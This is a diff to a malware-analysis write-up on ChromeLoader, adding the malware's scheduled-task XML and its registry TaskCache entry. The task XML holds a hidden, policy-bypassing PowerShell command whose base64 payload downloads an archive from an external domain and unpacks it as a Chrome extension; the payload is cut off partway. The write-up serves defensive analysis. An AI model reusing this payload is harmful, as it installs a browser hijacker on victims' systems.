@@ -78,15 +78,74 @@ DNSCompatibility.exe
 
 ### Scheduled Task
 
+ChromeLoader could be hardcoded into the binary (CS_installer.exe / Setup.exe) or via tasks for Windows
+
+### Schedule Task locations
+
+C:\windows\system32\tasks\ChromeLoader
+
 ```
-ChromeLoader could be hardcoded into the binary
+﻿<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Date>2022-01-08T12:48:01.586-05:00</Date>
+    <Description>Example task</Description>
+    <URI>\ChromeLoader</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <TimeTrigger>
+      <Repetition>
+        <Interval>PT10M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <StartBoundary>2022-01-08T12:49:01.55-05:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <Duration>PT10M</Duration>
+      <WaitTimeout>PT1H</WaitTimeout>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>cmd</Command>
+      <Arguments>/c start /min "" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E JABlAHgAdABQAGEAdABoACAAPQAgACIAJAAoACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQApAFwAYwBoAHIAbwBtAGUAIgAKACQAYwBvAG4AZgBQAGEAdABoACAAPQAgACIAJABlAHgAdABQAGEAdABoAFwAYwBvAG4AZgAuAGoAcwAiAAoAJABhAHIAYwBoAGkAdgBlAE4AYQBtAGUAIAA9ACAAIgAkACgAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACkAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAIgAKACQAdABhAHMAawBOAGEAbQBlACAAPQAgACIAQwBoAHIAbwBtAGUATABvAGEAZABlAHIAIgAKACQAZABvAG0AYQBpAG4AIAA9ACAAIgB5AGYAbABlAHgAaQBiAGkAbABpAHQAdQBrAHkALgBjAG8AIgAKAAoAJABpAHMATwBwAGUAbgAgAD0AIAAwAAoAJABkAGQAIAA9ACAAMAAKACQAdgBlAHIAIAA9ACAAMAAKAAoAKABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAAVwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAdABlAHIAIAAiAG4AYQBtAGUAPQAnAGMAaAByAG8AbQBlAC4AZQB4AGUAJwAiACkAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAEMAbwBtAG0AYQBuAGQATABpAG4AZQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7AAoACQBpAGYAKAAkAF8AIAAtAE0AYQB0AGMAaAAgACIAbABvAGEAZAAtAGUAeAB0AGUAbgBzAGkAbwBuACIAKQB7AAoACQAJAGIAcgBlAGEAawAKAAkAfQAKAAoACQAkAGkAcwBPAHAAZQBuACAAPQAgADEACgB9AAoACgBpAGYAKAAkAGkAcwBPAHAAZQBuACkAewAKAAoACQBpAGYAKAAtAG4AbwB0ACgAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAiACQAZQB4AHQAUABhAHQAaAAiACkAKQB7AAoACgAJAAkAdAByAHkAewAKAAkACQAJAHcAZwBlAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwAkAGQAbwBtAGEAaQBuAC8AYQByAGMAaABpAHYAZQAuAHoAaQBwACIAIAAtAG8AdQB0AGYAaQBsAGUAIAAiACQAYQByAGMAaABpAHYAZQBOAGEAbQBlACIACgAJAAkAfQBjAGEAdABjAGgAewAKAAkACQAJAGIAcgBlAGEAawAKAAkACQB9AAoACgAJAAkARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAiACQAYQByAGMAaABpAHYAZQBOAGEAbQBlACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAIgAkAGUAeAB0AFAAYQB0AGgAIgAgAC0ARgBvAHIAYwBlAAoACQAJAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgAC0AcABhAHQAaAAgACIAJABhAHIAYwBoAGkAdgBlAE4AYQBtAGUAIgAgAC0ARgBvAHIAYwBlAAoACgAJAH0ACgAJAGUAbABzAGUAewAKAAoACQAJAHQAcgB5AHsACgAJAAkACQBpAGYAIAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAIgAkAGMAbwBuAGYAUABhAHQAaAAiACkACgAJAAkACQB7AAoACQAJAAkACQAkAGMAbwBuAGYAIAA9ACAARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABjAG8AbgBmAFAAYQB0AGgACgAJAAkACQAJACQAYwBvAG4AZgAuAFMAcABsAGkAdAAoACIAOwAiACkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAKAAkACQAJAAkACQBpAGYAIAAoACQAXwAgAC0ATQBhAHQAYwBoACAAIgBkAGQAIgApAAoACQAJAAkACQAJAHsACgAJAAkACQAJAAkACQAkAGQAZAAgAD0AIAAkAF8ALgBTAHAAbABpAHQAKAAnACIAJwApAFsAMQBdAAoACQAJAAkACQAJAH0AZQBsAHMAZQBpAGYAIAAoACQAXwAgAC0ATQBhAHQAYwBoACAAIgBFAHgAdABlAG4AcwBpAG8AbgBWAGUAcgBzAGkAbwBuACIAKQAKAAkACQAJAAkACQB7AAoACQAJAAkACQAJAAkAJAB2AGUAcgAgAD0AIAAkAF8ALgBTAHAAbABpAHQAKAAnACIAJwApAFsAMQBdAAoACQAJAAkACQAJAH0ACgAJAAkACQAJAH0ACgAJAAkACQB9AAoACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAoACQAJAGkAZgAgACgAJABkAGQAIAAtAGEAbgBkACAAJAB2AGUAcgApAHsACgAKAAoACQAJAAkAdAByAHkAewAKAAoACQAJAAkACQAkAHUAbgAgAD0AIAB3AGcAZQB0ACAAIgBoAHQAdABwAHMAOgAvAC8AJABkAG8AbQBhAGkAbgAvAHUAbgA/AGQAaQBkAD0AJABkAGQAJgB2AGUAcgA9ACQAdgBlAHIAIgAKAAoACQAJAAkACQBpAGYAKAAkAHUAbgAgAC0ATQBhAHQAYwBoACAAIgAkAGQAZAAiACkAewAKAAkACQAJAAkACQBVAG4AcgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAkAHQAYQBzAGsATgBhAG0AZQAiACAALQBDAG8AbgBmAGkAcgBtADoAJABmAGEAbABzAGUACgAJAAkACQAJAAkAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBwAGEAdABoACAAIgAkAGUAeAB0AFAAYQB0AGgAIgAgAC0ARgBvAHIAYwBlACAALQBSAGUAYwB1AHIAcwBlAAoACQAJAAkACQB9AAoACgAJAAkACQB9AGMAYQB0AGMAaAB7AH0ACgAKAAkACQAJAHQAcgB5AHsACgAJAAkACQAJAHcAZwBlAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwAkAGQAbwBtAGEAaQBuAC8AYQByAGMAaABpAHYAZQAuAHoAaQBwAD8AZABpAGQAPQAkAGQAZAAmAHYAZQByAD0AJAB2AGUAcgAiAC
+```
 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\TREE\ChromeLoader
+
+```
+Property   Type Value                                                                                                                                 
+--------   ---- -----                                                                                                                                 
+SD       Binary (0x)01,00,04,80,94,00,00,00,b0,00,00,00,00,00,00,00,14,00,00,00,02,00,80,00,04,00,00,00,00,10,18,00,9f,01,1f,00,01,02,00,00,00,00,00,0
+                5,20,00,00,00,20,02,00,00,00,10,14,00,9f,01,1f,00,01,01,00,00,00,00,00,05,12,00,00,00,00,10,24,00,ff,01,1f,00,01,05,00,00,00,00,00,05,
+                15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,ea,03,00,00,00,00,24,00,89,00,12,00,01,05,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0
+                ,c4,03,8b,df,0b,88,58,ea,03,00,00,00,00,00,00,01,05,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,ea,03,00,00,01,0
+                5,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,01,02,00,00                                                       
+Id       String {95F41003-19E5-4FEF-BC34-BD6B24044329}                                                                                                
+Index     DWord 3 
+```
+
+Execution of scheduled task
+```
 cmd /c start /min "" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E <base64EncodedPayload>
-
-or standard method:
-
-Registry Key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\TREE\ChromeLoader
-Path: C:\windows\system32\tasks\ChromeLoader
 ```
 
 ### Snippet of base64 decoded powershell script
